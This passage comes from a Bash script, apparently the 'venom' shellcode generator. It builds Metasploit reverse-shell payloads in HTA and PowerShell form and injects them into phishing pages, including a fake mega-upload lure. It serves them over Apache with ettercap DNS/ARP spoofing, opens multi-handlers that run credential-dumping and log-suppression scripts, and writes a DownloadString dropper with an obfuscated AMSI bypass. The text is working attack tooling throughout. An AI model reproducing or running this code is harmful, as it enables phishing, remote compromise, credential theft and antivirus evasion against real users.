MULTI-HANDLER \" -geometry 110x23 -e \"sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'\" & xterm -T \" DNS_SPOOF [redirecting traffic] \" -geometry 110x10 -e \"sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //\"\n          fi\n\n\n        else\n\n        echo \"- ATTACK VECTOR: http://$lhost\"\n        echo \"- POST EXPLOIT : $P0\"\n        echo \"---\"\n        # START METASPLOIT LISTENNER (multi-handler with the rigth payload)\n        echo \"[☠] Start a multi-handler...\"\n        echo \"[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell\"\n        echo \"[☯] Please dont test samples on virus total...\"\n          if [ \"$MsFlF\" = \"ON\" ]; then\n            xterm -T \" PAYLOAD MULTI-HANDLER \" -geometry 110x23 -e \"sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'\"\n            cd $IPATH/output\n            # delete utf-8/non-ancii caracters from output\n            tr -cd '\\11\\12\\15\\40-\\176' < report.log > final.log\n            sed -i \"s/\\[0m//g\" final.log\n            sed -i \"s/\\[1m\\[34m//g\" final.log\n            sed -i \"s/\\[4m//g\" final.log\n            sed -i \"s/\\[K//g\" final.log\n            sed -i \"s/\\[1m\\[31m//g\" final.log\n            sed -i \"s/\\[1m\\[32m//g\" final.log\n            sed -i \"s/\\[1m\\[33m//g\" final.log\n            mv final.log $N4m-$lhost.log > /dev/null 2>&1\n            rm report.log > /dev/null 2>&1\n            cd $IPATH/\n          else\n            xterm -T \" PAYLOAD MULTI-HANDLER \" -geometry 110x23 -e \"sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'\"\n          fi\n        fi\n   fi\n\n\nsleep 2\n# CLEANING EVERYTHING UP\necho \"[☠] Cleanning temp generated files...\"\nmv $IPATH/templates/phishing/mega[bak].html $InJEc12 > /dev/null 2>&1\nmv $IPATH/templates/InvokePS1[bak].bat $InJEc8 > /dev/null 2>&1\nmv $IPATH/aux/privilege_escalation[bak].rc $IPATH/aux/privilege_escalation.rc > /dev/null 2>&1\nmv $IPATH/aux/msf/enigma_fileless_uac_bypass[bak].rb $IPATH/aux/msf/enigma_fileless_uac_bypass.rb > /dev/null 2>&1\nmv $IPATH/aux/persistence[bak].rc $IPATH/aux/persistence.rc > /dev/null 2>&1\nrm $IPATH/templates/phishing/copy.html > /dev/null 2>&1\nrm -r $H0m3/.psploit > /dev/null 2>&1\nrm $IPATH/output/chars.raw > /dev/null 2>&1\nrm $ApAcHe/$N4m.bat > /dev/null 2>&1\nrm $IPATH/bin/sedding.raw > /dev/null 2>&1\nrm $ApAcHe/index.html > /dev/null 2>&1\nrm /tmp/Invoke-Phant0m.ps1 > /dev/null 2>&1\nsleep 2\nclear\ncd $IPATH/\n\nelse\n\n  echo ${RedF}[x]${white} Abort module execution ..${Reset};\n  sleep 2\n  sh_microsoft_menu\n  clear\nfi\n}\n\n\n\n\n\n# -----------------------------------------------------\n# build shellcode in HTA-PSH format (windows-platforms)\n# reproduction of hta powershell attack in unicorn.py\n# one of my favorite methods by ReL1K :D \n# -----------------------------------------------------\nsh_shellcode10 () {\n# get user input to build shellcode\necho \"[☠] Enter shellcode settings!\"\nlhost=$(zenity --title=\"☠ Enter LHOST ☠\" --text \"example: $IP\" --entry --width 300) > /dev/null 2>&1\nif [ \"$?\" -eq \"0\" ]; then\nlport=$(zenity --title=\"☠ Enter LPORT ☠\" --text \"example: 666\" --entry --width 300) > /dev/null 2>&1\n# input payload choise\npaylo=$(zenity --list --title \"☠ SHELLCODE GENERATOR ☠\" --text \"\\nAvailable Payloads:\" --radiolist --column \"Pick\" --column \"Option\" TRUE \"windows/shell_bind_tcp\" FALSE \"windows/shell/reverse_tcp\" FALSE \"windows/meterpreter/reverse_tcp\" FALSE \"windows/meterpreter/reverse_tcp_dns\" FALSE \"windows/meterpreter/reverse_http\" FALSE \"windows/meterpreter/reverse_https\" FALSE \"windows/meterpreter/reverse_winhttps\" FALSE \"windows/x64/meterpreter/reverse_tcp\" FALSE \"windows/x64/meterpreter/reverse_https\" --width 350 --height 370) > /dev/null 2>&1\nN4m=$(zenity --entry --title \"☠ PAYLOAD NAME ☠\" --text \"Enter payload output name\\nexample: ReL1K\" --width 300) > /dev/null 2>&1\n\n\n## setting default values in case user have skip this ..\nif [ -z \"$lhost\" ]; then lhost=\"$IP\";fi\nif [ -z \"$lport\" ]; then lport=\"443\";fi\nif [ -z \"$N4m\" ]; then N4m=\"ReL1K\";fi\n\necho \"[☠] Building shellcode -> HTA-PSH format ...\"\nsleep 2\nif [ \"$paylo\" = \"windows/meterpreter/reverse_winhttps\" ] || [ \"$paylo\" = \"windows/meterpreter/reverse_https\" ] || [ \"$paylo\" = \"windows/x64/meterpreter/reverse_https\" ]; then\n   echo \"[☠] meterpreter over SSL sellected ..\";sleep 1\nfi\n\n# display final settings to user\ncat << !\n\n    venom settings\n    ──────────────\n    LPORT   : $lport\n    LHOST   : $lhost\n    FORMAT  : HTA-PSH -> WINDOWS\n    PAYLOAD : $paylo\n\n!\n\n# use metasploit to build shellcode\nif [ \"$paylo\" = \"windows/meterpreter/reverse_winhttps\" ] || [ \"$paylo\" = \"windows/meterpreter/reverse_https\" ] || [ \"$paylo\" = \"windows/x64/meterpreter/reverse_https\" ]; then\n   xterm -T \" SHELLCODE GENERATOR \" -geometry 110x23 -e \"msfvenom -p $paylo LHOST=$lhost LPORT=$lport HandlerSSLCert=$IPATH/obfuscate/www.gmail.com.pem StagerVerifySSLCert=true -f hta-psh > $IPATH/output/chars.raw\"\nelse\n   xterm -T \" SHELLCODE GENERATOR \" -geometry 110x23 -e \"msfvenom -p $paylo LHOST=$lhost LPORT=$lport -f hta-psh > $IPATH/output/chars.raw\"\nfi\n\necho \"\"\n# display generated shelcode\necho \"[☠] obfuscating -> base64 encoded!\"\nsleep 2\nstore=`cat $IPATH/output/chars.raw | awk {'print $7'}`\necho $store\necho \"\" && echo \"\"\n# grab shellcode from chars.raw\nSh33L=`cat $IPATH/output/chars.raw | grep \"powershell.exe -nop -w hidden -e\" | cut -d '\"' -f2`\n# copy chars.raw to hta_attack dir\ncp $IPATH/output/chars.raw $IPATH/templates/hta_attack/chars.raw\nsleep 2\n\n\n   # check if all dependencies needed are installed\n   # check if template exists\n   if [ -e $InJEc6 ]; then\n      echo \"[☠] exec.hta -> found!\"\n      sleep 2\n   else\n      echo \"[☠] exec.hta -> not found!\"\n      exit\n   fi\n\n   if [ -e $InJEc7 ]; then\n      echo \"[☠] index.html -> found!\"\n      sleep 2\n   else\n      echo \"[☠] index.html -> not found!\"\n      exit\n   fi\n\n   # check if chars.raw as generated\n   if [ -e $Ch4Rs ]; then\n      echo \"[☠] chars.raw -> found!\"\n      sleep 2\n \n   else\n\n      echo \"[☠] chars.raw -> not found!\"\n      exit\n      fi\n\n\n# EDITING/BACKUP FILES NEEDED\necho \"[☠] editing/backup files...\"\ncp $InJEc6 $IPATH/templates/hta_attack/mine[bak].hta\ncp $InJEc7 $IPATH/templates/hta_attack/index[bak].html\n\ncd $IPATH/templates/hta_attack\n# use SED to replace NaM3 and Inj3C\necho \"[☠] Injecting shellcode -> $N4m.hta!\"\n# replace NaM3 by $N4m (var grab by venom.sh)\nsed \"s|NaM3|$N4m.hta|g\" index.html > copy.html\nmv copy.html $IPATH/output/index.html\n# replace INj3C by shellcode stored in var Sh33L in 'meu_hta-psh.hta' file\nsed \"s|Inj3C|$Sh33L|g\" exec.hta > $N4m.hta\ncp $IPATH/templates/phishing/missing_plugin.png $ApAcHe/missing_plugin.png > /dev/null 2>&1\nmv $N4m.hta $IPATH/output/$N4m.hta > /dev/null 2>&1\nchown $user $IPATH/output/$N4m.hta > /dev/null 2>&1\n\n\n# CHOSE HOW TO DELIVER YOUR PAYLOAD\nserv=$(zenity --list --title \"☠ SHELLCODE GENERATOR ☠\" --text \"Payload stored:\\n$IPATH/output/$N4m.hta\\n$IPATH/output/index.html\\n\\nIf needed further encrypt your hta using:\\nshell/obfuscate/hta-to-javascript-crypter.html\\nbefore continue...\\n\\nchose how to deliver: $N4m.hta\" --radiolist --column \"Pick\" --column \"Option\" TRUE \"multi-handler (default)\" FALSE \"apache2 (malicious url)\" --width 350 --height 300) > /dev/null 2>&1\n\n   if [ \"$serv\" = \"multi-handler (default)\" ]; then\n      # START METASPLOIT LISTENNER (multi-handler with the rigth payload)\n      zenity --title=\"☠ SHELLCODE GENERATOR ☠\" --text \"Store the 2 files in apache2 webroot and\\nSend: [ http://$lhost/index.html ]\\nto target machine to execute payload\" --info --width 300 > /dev/null 2>&1\n      echo \"[☠] Start a multi-handler...\"\n      echo \"[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell\"\n      echo \"[☯] Please dont test samples on virus total...\"\n        if [ \"$MsFlF\" = \"ON\" ]; then\n\n          if [ \"$paylo\" = \"windows/meterpreter/reverse_winhttps\" ] || [ \"$paylo\" = \"windows/meterpreter/reverse_https\" ] || [ \"$paylo\" = \"windows/x64/meterpreter/reverse_https\" ]; then\n            xterm -T \" PAYLOAD MULTI-HANDLER \" -geometry 110x23 -e \"sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set HandlerSSLCert $IPATH/obfuscate/www.gmail.com.pem; set StagerVerifySSLCert true; exploit'\"\n          else\n            xterm -T \" PAYLOAD MULTI-HANDLER \" -geometry 110x23 -e \"sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; exploit'\"\n          fi\n\n          cd $IPATH/output\n          # delete utf-8/non-ancii caracters from output\n          tr -cd '\\11\\12\\15\\40-\\176' < report.log > final.log\n          sed -i \"s/\\[0m//g\" final.log\n          sed -i \"s/\\[1m\\[34m//g\" final.log\n          sed -i \"s/\\[4m//g\" final.log\n          sed -i \"s/\\[K//g\" final.log\n          sed -i \"s/\\[1m\\[31m//g\" final.log\n          sed -i \"s/\\[1m\\[32m//g\" final.log\n          sed -i \"s/\\[1m\\[33m//g\" final.log\n          mv final.log $N4m-$lhost.log > /dev/null 2>&1\n          rm report.log > /dev/null 2>&1\n          cd $IPATH/\n        else\n\n          if [ \"$paylo\" = \"windows/meterpreter/reverse_winhttps\" ] || [ \"$paylo\" = \"windows/meterpreter/reverse_https\" ] || [ \"$paylo\" = \"windows/x64/meterpreter/reverse_https\" ]; then\n            xterm -T \" PAYLOAD MULTI-HANDLER \" -geometry 110x23 -e \"sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set HandlerSSLCert $IPATH/obfuscate/www.gmail.com.pem; set StagerVerifySSLCert true; exploit'\"\n          else\n            xterm -T \" PAYLOAD MULTI-HANDLER \" -geometry 110x23 -e \"sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; exploit'\"\n          fi\n        fi\n      sleep 2\n\n\n   else\n\n\n      P0=$(zenity --list --title \"☠ SHELLCODE GENERATOR ☠\" --text \"\\npost-exploitation module to run\" --radiolist --column \"Pick\" --column \"Option\" TRUE \"sysinfo.rc\" FALSE \"enum_system.rc\" FALSE \"dump_credentials.rc\" FALSE \"fast_migrate.rc\" FALSE \"stop_logfiles_creation.rc\" FALSE \"exploit_suggester.rc\" --width 305 --height 300) > /dev/null 2>&1\n\n\n  if [ \"$P0\" = \"stop_logfiles_creation.rc\" ]; then\n    #\n    # check if dependencies exist ..\n    #\n    if [ -e \"$pHanTom/post/windows/manage/Invoke-Phant0m.rb\" ]; then\n      echo \"[☠] Invoke-Phant0m.rb installed ..\"\n      sleep 2\n    else\n      echo \"[x] Invoke-Phant0m.rb not found ..\"\n      sleep 2\n      echo \"[☠] copy Invoke-Phant0m.rb to msfdb ..\"\n      sleep 2\n      cp $IPATH/aux/msf/Invoke-Phant0m.rb $pHanTom/post/windows/manage/Invoke-Phant0m.rb > /dev/null 2>&1\n      echo \"[☠] Reloading msfdb database ..\"\n      sleep 2\n      xterm -T \"RELOADING MSF DATABASE\" -geometry 110x23 -e \"msfdb reinit\" > /dev/null 2>&1\n      xterm -T \"RELOADING MSF DATABASE\" -geometry 110x23 -e \"msfconsole -q -x 'db_status; reload_all; exit -y'\" > /dev/null 2>&1\n    fi\n\n      #\n      # check if Invoke-Phantom.ps1 exists ..\n      #\n      if [ -e \"$IPATH/aux/Invoke-Phant0m.ps1\" ]; then\n        echo \"[☠] Invoke-Phant0m.ps1 found ..\"\n        sleep 2\n        cp $IPATH/aux/Invoke-Phant0m.ps1 /tmp/Invoke-Phant0m.ps1 > /dev/null 2>&1\n      else\n        echo \"[x] Invoke-Phant0m.ps1 not found ..\"\n        sleep 2\n        echo \"[☠] Please place module in $IPATH/aux folder ..\"\n        sleep 2\n        exit\n      fi\n  fi\n\n\n\n\n      cd $IPATH/output\n      cp $N4m.hta $ApAcHe/$N4m.hta > /dev/null 2>&1\n      cp index.html $ApAcHe/index.html > /dev/null 2>&1\n      echo \"[☠] loading -> Apache2Server!\"\n      echo \"---\"\n      echo \"- SEND THE URL GENERATED TO TARGET HOST\"\n\n        if [ \"$D0M4IN\" = \"YES\" ]; then\n        # copy files nedded by mitm+dns_spoof module\n        sed \"s|NaM3|$N4m.hta|\" $IPATH/templates/phishing/mega.html > $ApAcHe/index.html\n        cp $IPATH/output/$N4m.hta $ApAcHe/$N4m.hta\n        echo \"- ATTACK VECTOR: http://mega-upload.com\"\n        echo \"- POST EXPLOIT : $P0\"\n        echo \"---\"\n        # START METASPLOIT LISTENNER (multi-handler with the rigth payload)\n        echo \"[☠] Start a multi-handler...\"\n        echo \"[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell\"\n        echo \"[☯] Please dont test samples on virus total...\"\n          if [ \"$MsFlF\" = \"ON\" ]; then\n\n            if [ \"$paylo\" = \"windows/meterpreter/reverse_winhttps\" ] || [ \"$paylo\" = \"windows/meterpreter/reverse_https\" ] || [ \"$paylo\" = \"windows/x64/meterpreter/reverse_https\" ]; then\n              xterm -T \" PAYLOAD MULTI-HANDLER \" -geometry 110x23 -e \"sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set HandlerSSLCert $IPATH/obfuscate/www.gmail.com.pem; set StagerVerifySSLCert true; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'\" & xterm -T \" DNS_SPOOF [redirecting traffic] \" -geometry 110x10 -e \"sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //\"\n            else\n              xterm -T \" PAYLOAD MULTI-HANDLER \" -geometry 110x23 -e \"sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'\" & xterm -T \" DNS_SPOOF [redirecting traffic] \" -geometry 110x10 -e \"sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //\"\n            fi\n\n            cd $IPATH/output\n            # delete utf-8/non-ancii caracters from output\n            tr -cd '\\11\\12\\15\\40-\\176' < report.log > final.log\n            sed -i \"s/\\[0m//g\" final.log\n            sed -i \"s/\\[1m\\[34m//g\" final.log\n            sed -i \"s/\\[4m//g\" final.log\n            sed -i \"s/\\[K//g\" final.log\n            sed -i \"s/\\[1m\\[31m//g\" final.log\n            sed -i \"s/\\[1m\\[32m//g\" final.log\n            sed -i \"s/\\[1m\\[33m//g\" final.log\n            mv final.log $N4m-$lhost.log > /dev/null 2>&1\n            rm report.log > /dev/null 2>&1\n            cd $IPATH/\n          else\n\n            if [ \"$paylo\" = \"windows/meterpreter/reverse_winhttps\" ] || [ \"$paylo\" = \"windows/meterpreter/reverse_https\" ] || [ \"$paylo\" = \"windows/x64/meterpreter/reverse_https\" ]; then\n              xterm -T \" PAYLOAD MULTI-HANDLER \" -geometry 110x23 -e \"sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set HandlerSSLCert $IPATH/obfuscate/www.gmail.com.pem; set StagerVerifySSLCert true; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'\" & xterm -T \" DNS_SPOOF [redirecting traffic] \" -geometry 110x10 -e \"sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //\"\n            else\n              xterm -T \" PAYLOAD MULTI-HANDLER \" -geometry 110x23 -e \"sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'\" & xterm -T \" DNS_SPOOF [redirecting traffic] \" -geometry 110x10 -e \"sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //\"\n            fi\n          fi\n\n\n        else\n\n        echo \"- ATTACK VECTOR: http://$lhost\"\n        echo \"- POST EXPLOIT : $P0\"\n        echo \"---\"\n        # START METASPLOIT LISTENNER (multi-handler with the rigth payload)\n        echo \"[☠] Start a multi-handler...\"\n        echo \"[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell\"\n        echo \"[☯] Please dont test samples on virus total...\"\n          if [ \"$MsFlF\" = \"ON\" ]; then\n\n            if [ \"$paylo\" = \"windows/meterpreter/reverse_winhttps\" ] || [ \"$paylo\" = \"windows/meterpreter/reverse_https\" ] || [ \"$paylo\" = \"windows/x64/meterpreter/reverse_https\" ]; then\n              xterm -T \" PAYLOAD MULTI-HANDLER \" -geometry 110x23 -e \"sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set HandlerSSLCert $IPATH/obfuscate/www.gmail.com.pem; set StagerVerifySSLCert true; exploit'\"\n            else\n              xterm -T \" PAYLOAD MULTI-HANDLER \" -geometry 110x23 -e \"sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'\"\n            fi\n\n            cd $IPATH/output\n            # delete utf-8/non-ancii caracters from output\n            tr -cd '\\11\\12\\15\\40-\\176' < report.log > final.log\n            sed -i \"s/\\[0m//g\" final.log\n            sed -i \"s/\\[1m\\[34m//g\" final.log\n            sed -i \"s/\\[4m//g\" final.log\n            sed -i \"s/\\[K//g\" final.log\n            sed -i \"s/\\[1m\\[31m//g\" final.log\n            sed -i \"s/\\[1m\\[32m//g\" final.log\n            sed -i \"s/\\[1m\\[33m//g\" final.log\n            mv final.log $N4m-$lhost.log > /dev/null 2>&1\n            rm report.log > /dev/null 2>&1\n            cd $IPATH/\n          else\n\n            if [ \"$paylo\" = \"windows/meterpreter/reverse_winhttps\" ] || [ \"$paylo\" = \"windows/meterpreter/reverse_https\" ] || [ \"$paylo\" = \"windows/x64/meterpreter/reverse_https\" ]; then\n              xterm -T \" PAYLOAD MULTI-HANDLER \" -geometry 110x23 -e \"sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set HandlerSSLCert $IPATH/obfuscate/www.gmail.com.pem; set StagerVerifySSLCert true; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'\"\n            else\n              xterm -T \" PAYLOAD MULTI-HANDLER \" -geometry 110x23 -e \"sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'\"\n            fi\n          fi\n        fi\n   fi\n\n\nsleep 2\n# CLEANING EVERYTHING UP\necho \"[☠] Cleanning temp generated files...\"\nmv $IPATH/templates/hta_attack/mine[bak].hta $InJEc6 > /dev/null 2>&1\nmv $IPATH/templates/hta_attack/index[bak].html $InJEc7 > /dev/null 2>&1\nrm $IPATH/templates/hta_attack/chars.raw > /dev/null 2>&1\nrm $IPATH/output/chars.raw > /dev/null 2>&1\nrm $IPATH/output/index.html > /dev/null 2>&1\nrm $ApAcHe/$N4m.hta > /dev/null 2>&1\nrm $ApAcHe/index.html > /dev/null 2>&1\nrm $ApAcHe/missing_plugin.png > /dev/null 2>&1\nrm /tmp/Invoke-Phant0m.ps1 > /dev/null 2>&1\nsleep 2\nclear\ncd $IPATH/\n\nelse\n\n  echo ${RedF}[x]${white} Abort module execution ..${Reset};\n  sleep 2\n  sh_microsoft_menu\n  clear\nfi\n}\n\n\n\n\n\n# --------------------------------------------------------------\n# build shellcode in PS1 (windows systems)\n# 'Matthew Graeber' powershell <DownloadString> technic\n# --------------------------------------------------------------\nsh_shellcode11 () {\n# get user input to build shellcode\necho \"[☠] Enter shellcode settings!\"\nlhost=$(zenity --title=\"☠ Enter LHOST ☠\" --text \"example: $IP\" --entry --width 300) > /dev/null 2>&1\nif [ \"$?\" -eq \"0\" ]; then\nlport=$(zenity --title=\"☠ Enter LPORT ☠\" --text \"example: 666\" --entry --width 300) > /dev/null 2>&1\nN4m=$(zenity --entry --title \"☠ SHELLCODE NAME ☠\" --text \"Enter shellcode output name\\nexample: Graeber\" --width 300) > /dev/null 2>&1\n# input payload choise\npaylo=$(zenity --list --title \"☠ SHELLCODE GENERATOR ☠\" --text \"\\nAvailable Payloads:\" --radiolist --column \"Pick\" --column \"Option\" TRUE \"windows/shell_bind_tcp\" FALSE \"windows/shell/reverse_tcp\" FALSE \"windows/meterpreter/reverse_tcp\" FALSE \"windows/meterpreter/reverse_tcp_dns\" FALSE \"windows/meterpreter/reverse_http\" FALSE \"windows/meterpreter/reverse_https\" FALSE \"windows/meterpreter/reverse_winhttps\" FALSE \"windows/x64/meterpreter/reverse_tcp\" FALSE \"windows/x64/meterpreter/reverse_https\" --width 350 --height 370) > /dev/null 2>&1\n\n\n## setting default values in case user have skip this ..\nif [ -z \"$lhost\" ]; then lhost=\"$IP\";fi\nif [ -z \"$lport\" ]; then lport=\"443\";fi\nif [ -z \"$N4m\" ]; then N4m=\"Graeber\";fi\n\necho \"[☠] Building shellcode -> psh-cmd format ...\"\nsleep 2\nif [ \"$paylo\" = \"windows/meterpreter/reverse_winhttps\" ] || [ \"$paylo\" = \"windows/meterpreter/reverse_https\" ] || [ \"$paylo\" = \"windows/x64/meterpreter/reverse_https\" ]; then\n   echo \"[☠] meterpreter over SSL sellected ..\";sleep 1\nfi\n\n# display final settings to user\ncat << !\n\n    venom settings\n    ──────────────\n    LPORT   : $lport\n    LHOST   : $lhost\n    FORMAT  : PSH-CMD -> WINDOWS\n    PAYLOAD : $paylo\n\n!\n\n#\n# use metasploit to build shellcode\n# HINT: use -n to add extra bits (random) of nopsled data to evade signature detection\n#\nKEYID=$(cat /dev/urandom | tr -dc '13' | fold -w 3 | head -n 1)\nif [ \"$paylo\" = \"windows/meterpreter/reverse_winhttps\" ] || [ \"$paylo\" = \"windows/meterpreter/reverse_https\" ] || [ \"$paylo\" = \"windows/x64/meterpreter/reverse_https\" ]; then\n   xterm -T \" SHELLCODE GENERATOR \" -geometry 110x23 -e \"msfvenom -p $paylo LHOST=$lhost LPORT=$lport HandlerSSLCert=$IPATH/obfuscate/www.gmail.com.pem StagerVerifySSLCert=true -f psh-cmd -n 20 > $IPATH/output/chars.raw\"\nelse\n   xterm -T \" SHELLCODE GENERATOR \" -geometry 110x23 -e \"sudo msfvenom -p $paylo LHOST=$lhost LPORT=$lport -f psh-cmd -n $KEYID > $IPATH/output/chars.raw\" > /dev/null 2>&1\nfi\n\n# parsing shellcode data\nstr0=`cat $IPATH/output/chars.raw | awk {'print $12'}`\necho \"$str0\" > $IPATH/output/chars.raw\n\n\n# display shellcode\necho \"\"\necho \"[☠] obfuscating -> base64 encoded!\"\nsleep 3\necho $str0\necho \"\" && echo \"\"\n\n# EDITING/BACKUP FILES NEEDED\necho \"[☠] editing/backup files...\"\ncp $InJEc7 $IPATH/templates/hta_attack/index[bak].html\nsleep 2\n\n   # check if chars.raw as generated\n   if [ -e $Ch4Rs ]; then\n      echo \"[☠] chars.raw -> found!\"\n      sleep 2\n \n   else\n\n      echo \"[☠] chars.raw -> not found!\"\n      exit\n      fi\n\n\n\ncd $IPATH/output/\n# compiling to ps1 output format\necho \"[☠] Injecting shellcode -> $N4m.ps1!\"\nsleep 2\nOBF=$(zenity --list --title \"☠ AGENT STRING OBFUSCATION ☠\" --text \"Obfuscate the agent [ template ] command arguments ?\\nUsing special escape characters, whitespaces, concaternation, amsi\\nsandbox evasion and variables piped and de-obfuscated at runtime\\n'The agent will delay 3 sec is execution to evade sandbox detection'\" --radiolist --column \"Pick\" --column \"Option\" TRUE \"None-Obfuscation (default)\" FALSE \"String Obfuscation (3 sec)\" --width 353 --height 245) > /dev/null 2>&1\nif [ \"$OBF\" = \"None-Obfuscation (default)\" ]; then\necho \"Write-Host \\\"Please Wait, installing software..\\\" -ForeGroundColor green;powershell.exe -nop -wind hidden -Exec Bypass -noni -enc Sh33L\" > payload.raw\nelse\necho \"[✔] String obfuscation technic sellected ..\"\nsleep 2\necho \"[☠] Building $N4m.ps1 agent ..\"\n# OBFUSCATE SYSCALLS (evade AV/AMSI + SandBox Detection)\n# https://github.com/r00t-3xp10it/hacking-material-books/blob/master/obfuscation/simple_obfuscation.md\n# HINT: setting -ExecutionPolicy/-ep is redundant since -EncodedCommand/-enc automatically bypasses the execution policy\n#\n# STRING: powershell.exe -NoPRo -wIN 1 -nONi -eN Sh33L\necho \"Write-Host \\\"Please Wait, installing software..\\\";pi\\`ng -n 3 ww\\`w.mi\\`cro\\`sof\\`t.co\\`m > \\$env:tmp\\\\li\\`ce\\`nce.p\\`em;\\$method=(\\\"{1}{2}{0}\\\" -f'N','/','e');\\$ScriptBlock = \\\"'Sy?s%t%e??m.Ma%na?geme?nt.Auto?mat?i%o%n.A?msi?U%t%i?ls'\\\";\\$UBlock = \\\"'am?s%i%?In?it%F?ai?l%e%d'\\\";\\$reg = \\$ScriptBlock.Replace(\\\"?\\\",\\\"\\\").Replace(\\\"%\\\",\\\"\\\");\\$off = \\$UBlock.Replace(\\\"?\\\",\\\"\\\").Replace(\\\"%\\\",\\\"\\\");[ref].Assembly.GetType(\\$reg).GetField(\\$off, 'NonPublic,Static').SetValue(\\$null,\\$true);\\$cert=(\\\"{1}{3}{0}{2}\\\" -f'N','/n','i','O');Pow\\`ers\\`hell.e\\`Xe /No\\`PR\\`o  /wI\\`N 1 \\$cert \\$method Sh33L\" > payload.raw\nfi\n#\n# parsing data\n#\nsed \"s|Sh33L|$str0|\" payload.raw > $N4m.ps1\nrm $IPATH/output/payload.raw > /dev/null 2>&1\n\n\n# build installer.bat (x86) to call .ps1\necho \"[☠] Building installer.bat dropper ..\"\nsleep 2\nif [ \"$OBF\" = \"None-Obfuscation (default)\" ]; then\necho \"@echo off&&powershell.exe IEX (New-Object Net.WebClient).DownloadString('http://$lhost/$N4m.ps1')\" > $IPATH/output/installer.bat\nelse\necho \"@e%!%ch^O Of^f&&@c^Md%i%\\\".\\\"e%db%X^e ,/^R ,, =po%$'''!%W^er%,,,%She^ll.E^x%Count+3%e I%pP0%E^X (N%on%e^w-Obj^e%$,,,%ct N%i0%e^t.We^bC%A%lie^n%$'''d%t).Do%pP0%wn^loa%UI%d^Str^i%$'''E%ng('h'+'tt'+'p:'+'//'+'$lhost/$N4m.ps'+'1')\" > $IPATH/output/installer.bat\nfi\n\n\n# CHOSE HOW TO DELIVER YOUR PAYLOAD\nserv=$(zenity --list --title \"☠ SHELLCODE GENERATOR ☠\" --text \"Payload stored:\\n$IPATH/output/$N4m.ps1\\n$IPATH/output/installer.bat\\n\\nchose how to deliver: installer.bat\" --radiolist --column \"Pick\" --column \"Option\" TRUE \"multi-handler (default)\" FALSE \"apache2 (malicious url)\" --width 305 --height 260) > /dev/null 2>&1\n\n   if [ \"$serv\" = \"multi-handler (default)\" ]; then\n      # START METASPLOIT LISTENNER (multi-handler with the rigth payload)\n      zenity --title=\"☠ SHELLCODE GENERATOR ☠\" --text \"Store $N4m in apache2 webroot and\\nexecute installer.bat on target machine\" --info --width 300 > /dev/null 2>&1\n      echo \"[☠] Start a multi-handler...\"\n      echo \"[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell\"\n      echo \"[☯] Please dont test samples on virus total...\"\n        if [ \"$MsFlF\" = \"ON\" ]; then\n\n          if [ \"$paylo\" = \"windows/meterpreter/reverse_winhttps\" ] || [ \"$paylo\" = \"windows/meterpreter/reverse_https\" ] || [ \"$paylo\" = \"windows/x64/meterpreter/reverse_https\" ]; then\n            xterm -T \" PAYLOAD MULTI-HANDLER \" -geometry 110x23 -e \"sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set HandlerSSLCert $IPATH/obfuscate/www.gmail.com.pem; set StagerVerifySSLCert true; exploit'\"\n          else\n            xterm -T \" PAYLOAD MULTI-HANDLER \" -geometry 110x23 -e \"sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; exploit'\"\n         fi\n\n          cd $IPATH/output\n          # delete utf-8/non-ancii caracters from output\n          tr -cd '\\11\\12\\15\\40-\\176' < report.log > final.log\n          sed -i \"s/\\[0m//g\" final.log\n          sed -i 